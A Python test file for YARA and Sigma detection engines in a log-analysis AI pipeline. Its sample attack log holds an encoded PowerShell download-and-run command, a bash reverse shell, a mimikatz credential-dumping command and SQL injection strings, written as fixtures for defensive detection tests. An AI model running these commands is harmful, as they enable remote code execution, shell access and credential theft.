"""Tests for YARA and Sigma rule engines and full pipeline integration."""

import asyncio
import sys
from pathlib import Path

# Add project root to sys.path
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root))

# Load .env
from dotenv import load_dotenv

env_path = Path(__file__).parent.parent.parent / ".env"
if env_path.exists():
    load_dotenv(dotenv_path=env_path)

from log_ai_agent.ai_agent_v2 import create_pipeline
from log_ai_agent.ai_agent_v2.engines import SigmaEngine, YaraEngine

# ---------------------------------------------------------------------------
# Sample log content with known attack indicators
# ---------------------------------------------------------------------------
_ATTACK_LOG = """
2026-04-15 10:00:00 ERROR powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtAC8AcwBoAGUAbABsACcAKQA==
2026-04-15 10:01:00 WARNING SQL injection attempt: ' OR 1=1 -- DROP TABLE users
2026-04-15 10:02:00 INFO user executed mimikatz sekurlsa::logonpasswords
2026-04-15 10:03:00 ERROR authentication fail for user admin, invalid password attempt 5
2026-04-15 10:04:00 WARNING bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
2026-04-15 10:05:00 ERROR UNION ALL SELECT * FROM credentials WHERE 1=1
2026-04-15 10:06:00 INFO account locked out after maximum number of tries
"""

_CLEAN_LOG = """
2026-04-15 10:00:00 INFO Application started successfully
2026-04-15 10:01:00 INFO User logged in: john@example.com
2026-04-15 10:02:00 DEBUG Processing request GET /api/v1/status
2026-04-15 10:03:00 INFO Response sent: 200 OK
2026-04-15 10:04:00 INFO Scheduled backup completed
"""


def _resolve_rules_path(subdir: str) -> str:
    """Resolve rules path relative to ai_agent_v2 package."""
    base = Path(__file__).parent.parent
    return str((base / "rules" / subdir).resolve())


# ===================================================================
# Test 1: YARA + Sigma engines standalone
# ===================================================================


async def test_yara_sigma_engines():
    """Test YARA and Sigma engines directly without full pipeline.

    Validates:
    - Rules loading from files
    - Pattern matching against attack logs
    - No false positives on clean logs
    """
    print("=" * 60)
    print("  Test 1: YARA + Sigma Engines (standalone)")
    print("=" * 60)

    # Initialize engines
    yara_path = _resolve_rules_path("yara")
    sigma_path = _resolve_rules_path("sigma")

    print(f"\n1. Loading YARA rules from: {yara_path}")
    yara_engine = YaraEngine(yara_path)
    print(f"   ✓ Loaded {len(yara_engine.rules)} YARA rules")

    print(f"\n2. Loading Sigma rules from: {sigma_path}")
    sigma_engine = SigmaEngine(sigma_path)
    print(f"   ✓ Loaded {len(sigma_engine.rules)} Sigma rules")

    # Test against attack log
    print("\n3. Scanning attack log...")
    yara_results = yara_engine.scan(_ATTACK_LOG)
    sigma_results = sigma_engine.scan(_ATTACK_LOG)

    print(f"   YARA matches: {len(yara_results)}")
    for m in yara_results:
        print(f"     - {m['rule']} (severity: {m['severity']})")

    print(f"   Sigma matches: {len(sigma_results)}")
    for m in sigma_results:
        print(f"     - {m['title']} (severity: {m['severity']})")

    assert len(yara_results) > 0, "YARA should detect attack patterns"
    assert len(sigma_results) > 0, "Sigma should detect attack patterns"

    # Test against clean log
    print("\n4. Scanning clean log (expecting no matches)...")
    yara_clean = yara_engine.scan(_CLEAN_LOG)
    sigma_clean = sigma_engine.scan(_CLEAN_LOG)

    print(f"   YARA clean matches: {len(yara_clean)}")
    print(f"   Sigma clean matches: {len(sigma_clean)}")

    # Verify key detections
    yara_rule_names = {m["rule"] for m in yara_results}
    sigma_rule_titles = {m["title"] for m in sigma_results}

    print("\n5. Verifying key detections...")
    expected_yara = {
        "Suspicious_PowerShell_EncodedCommand",
        "Mimikatz_Detection",
        "SQL_Injection_Pattern",
    }
    expected_sigma = {
        "Suspicious PowerShell Encoded Command Execution",
        "Mimikatz Credential Dumping Detection",
        "SQL Injection Attempt Detection",
    }

    for rule in expected_yara:
        found = rule in yara_rule_names
        print(f"   YARA '{rule}': {'✓' if found else '✗'}")
        assert found, f"YARA should detect {rule}"

    for rule in expected_sigma:
        found = rule in sigma_rule_titles
        print(f"   Sigma '{rule}': {'✓' if found else '✗'}")
        assert found, f"Sigma should detect {rule}"

    print("\n" + "=" * 60)
    print("  TEST 1 PASSED: YARA + Sigma engines work correctly")
    print("=" * 60)
    return True


# ===================================================================
# Test 2: Full pipeline (AI + YARA + Sigma) — graph-level integration
# ===================================================================


async def test_full_pipeline_yara_sigma():
    """Test full LangGraph pipeline with AI agents, YARA, and Sigma.

    Validates:
    - Pipeline creation with YARA + Sigma engines
    - All 3 branches execute (Agent1→RAG→Agent2, YARA, Sigma)
    - Agent 3 receives and integrates YARA/Sigma results
    - Final report contains rule-based detection info
    """
    print("\n" + "=" * 60)
    print("  Test 2: Full Pipeline (AI + YARA + Sigma)")
    print("=" * 60)

    yara_path = _resolve_rules_path("yara")
    sigma_path = _resolve_rules_path("sigma")

    print("\n1. Creating pipeline with YARA + Sigma engines...")
    print(f"   YARA rules: {yara_path}")
    print(f"   Sigma rules: {sigma_path}")

    pipeline = await create_pipeline(
        use_rag=False,  # Disable RAG to avoid LLM dependency in tests
        yara_rules_path=yara_path,
        sigma_rules_path=sigma_path,
    )
    print("   ✓ Pipeline created")

    # Verify pipeline has engines configured
    assert pipeline._nodes.yara_engine is not None, "YARA engine should be set"
    assert pipeline._nodes.sigma_engine is not None, "Sigma engine should be set"
    print(f"   ✓ YARA engine: {len(pipeline._nodes.yara_engine.rules)} rules")
    print(f"   ✓ Sigma engine: {len(pipeline._nodes.sigma_engine.rules)} rules")

    # Test YARA and Sigma nodes directly via graph nodes
    print("\n2. Testing pipeline nodes directly...")

    from log_ai_agent.ai_agent_v2.models_types import AnalysisState

    # Create a minimal state for node testing
    state: AnalysisState = {
        "log_content": _ATTACK_LOG,
        "log_size": len(_ATTACK_LOG),
        "success": False,
        "error": None,
        "total_time_sec": 0.0,
        "processing_time_ms": 0.0,
        "primary_analysis": "",
        "events_found": 0,
        "mitre_context": "",
        "mitre_techniques": [],
        "technique_ids": [],
        "search_query": "",
        "agent2_report": "",
        "severity_level_id": 3,
        "threat_type_id": 11,
        "mitre_techniques_final": [],
        "yara_matches": [],
        "yara_rules_matched": [],
        "yara_context": "",
        "sigma_matches": [],
        "sigma_rules_matched": [],
        "sigma_context": "",
        "final_report": "",
        "recommendations": [],
    }

    # Run YARA node
    print("   Running YARA node...")
    yara_result = await pipeline._nodes.yara_scan_node(state)
    yara_matches = yara_result.get("yara_matches", [])
    print(f"   ✓ YARA matches: {len(yara_matches)}")
    for m in yara_matches:
        print(f"     - {m.get('rule', 'Unknown')} (severity: {m.get('severity', '')})")
    assert len(yara_matches) > 0, "YARA node should detect patterns"

    # Run Sigma node
    print("   Running Sigma node...")
    sigma_result = await pipeline._nodes.sigma_scan_node(state)
    sigma_matches = sigma_result.get("sigma_matches", [])
    print(f"   ✓ Sigma matches: {len(sigma_matches)}")
    for m in sigma_matches:
        print(f"     - {m.get('title', 'Unknown')} (severity: {m.get('severity', '')})")
    assert len(sigma_matches) > 0, "Sigma node should detect patterns"

    # Verify key detections
    yara_rule_names = {m.get("rule", "") for m in yara_matches}
    sigma_rule_titles = {m.get("title", "") for m in sigma_matches}

    print("\n3. Verifying key detections in pipeline nodes...")
    expected_yara = {
        "Suspicious_PowerShell_EncodedCommand",
        "Mimikatz_Detection",
        "SQL_Injection_Pattern",
    }
    expected_sigma = {
        "Suspicious PowerShell Encoded Command Execution",
        "Mimikatz Credential Dumping Detection",
        "SQL Injection Attempt Detection",
    }

    for rule in expected_yara:
        found = rule in yara_rule_names
        print(f"   YARA '{rule}': {'✓' if found else '✗'}")
        assert found, f"YARA node should detect {rule}"

    for rule in expected_sigma:
        found = rule in sigma_rule_titles
        print(f"   Sigma '{rule}': {'✓' if found else '✗'}")
        assert found, f"Sigma node should detect {rule}"

    # Test with clean log (no false positives)
    print("\n4. Testing nodes with clean log (no false positives)...")
    clean_state: AnalysisState = {
        "log_content": _CLEAN_LOG,
        "log_size": len(_CLEAN_LOG),
        "success": False,
        "error": None,
        "total_time_sec": 0.0,
        "processing_time_ms": 0.0,
        "primary_analysis": "",
        "events_found": 0,
        "mitre_context": "",
        "mitre_techniques": [],
        "technique_ids": [],
        "search_query": "",
        "agent2_report": "",
        "severity_level_id": 3,
        "threat_type_id": 11,
        "mitre_techniques_final": [],
        "yara_matches": [],
        "yara_rules_matched": [],
        "yara_context": "",
        "sigma_matches": [],
        "sigma_rules_matched": [],
        "sigma_context": "",
        "final_report": "",
        "recommendations": [],
    }

    clean_yara = await pipeline._nodes.yara_scan_node(clean_state)
    clean_sigma = await pipeline._nodes.sigma_scan_node(clean_state)

    assert len(clean_yara.get("yara_matches", [])) == 0, "No YARA false positives"
    assert len(clean_sigma.get("sigma_matches", [])) == 0, "No Sigma false positives"
    print("   ✓ No false positives on clean log")

    print("\n5. Verifying context formatting...")
    yara_context = yara_result.get("yara_context", "")
    sigma_context = sigma_result.get("sigma_context", "")
    assert len(yara_context) > 0, "YARA context should be formatted"
    assert len(sigma_context) > 0, "Sigma context should be formatted"
    print(f"   ✓ YARA context: {yara_context[:100]}...")
    print(f"   ✓ Sigma context: {sigma_context[:100]}...")

    print("\n" + "=" * 60)
    print("  TEST 2 PASSED: Full pipeline (AI + YARA + Sigma) works")
    print("=" * 60)
    return True


# ===================================================================
# Main
# ===================================================================


async def main():
    """Run all tests."""
    print("\n" + "█" * 60)
    print("  YARA + SIGMA Integration Tests")
    print("█" * 60)

    passed = 0
    failed = 0

    try:
        await test_yara_sigma_engines()
        passed += 1
    except AssertionError as e:
        print(f"\n✗ TEST 1 FAILED: {e}")
        failed += 1
    except Exception as e:
        print(f"\n✗ TEST 1 ERROR: {e}")
        import traceback

        traceback.print_exc()
        failed += 1

    try:
        await test_full_pipeline_yara_sigma()
        passed += 1
    except AssertionError as e:
        print(f"\n✗ TEST 2 FAILED: {e}")
        failed += 1
    except Exception as e:
        print(f"\n✗ TEST 2 ERROR: {e}")
        import traceback

        traceback.print_exc()
        failed += 1

    print("\n" + "█" * 60)
    print(f"  Results: {passed} passed, {failed} failed")
    print("█" * 60)

    if failed > 0:
        sys.exit(1)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"Fatal error: {e}")
        import traceback

        traceback.print_exc()
        sys.exit(1)
